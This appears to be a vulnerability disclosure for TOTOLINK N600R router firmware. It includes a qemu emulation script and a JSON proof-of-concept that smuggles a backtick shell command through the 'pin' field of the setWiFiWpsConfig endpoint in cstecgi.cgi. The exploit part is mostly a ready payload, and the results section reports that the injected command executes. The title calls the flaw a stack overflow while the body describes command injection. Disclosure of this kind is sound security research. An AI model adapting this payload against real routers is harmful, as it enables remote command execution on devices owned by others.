# TOTOLINK_N600R_V4.3.0cu.7866_B20220506-stack overflow

## File information

[](https://github.com/Luanruy/qax#file-information)

TOTOLINK_N600R_V4.3.0cu.7866_B20220506.web Unzipped cstecgi.cgi Download address:  [https://totolink.tw/support_view/N600R](https://totolink.tw/support_view/N600R)

## injection point 0x41caac

There is an injection attack vulnerability in the function FUN_0041c824.
The code disassembled by ghidra is shown in the figure below:

![enter image description here](https://i.miji.bid/2025/05/07/456dd04d343e04d87e7fde1fc2a4b66b.png)

### Simulate running in qemu
```bash
#!/bin/bash
sudo  chroot  ./  ./qemu-mips-static\
-E  CONTENT_LENGTH="990"  -g  123  -L  ./lib  \
./web_cste/cgi-bin/cstecgi_41c8dc.cgi  <  ./poke/41caac_poc.json
```
### json
```json
{

	"topicurl" : "UploadCustomModule/setWiFiWpsConfig",
	"wifiIdx" : "1",
	"wscMode" : "1",
	"wscPinMode" : "1",
	"pin" : "11111111111111111111`ls>41caac.txt`ll"
}
```

### Operation Results
When running to the system instruction in gdb, it is found that the executed string contains the injected command.
After execution, you can see that the corresponding file is generated in the corresponding folder.
![enter image description here](https://i.miji.bid/2025/05/07/bb335c1b28c2205899b0380cc1fcce4a.png)


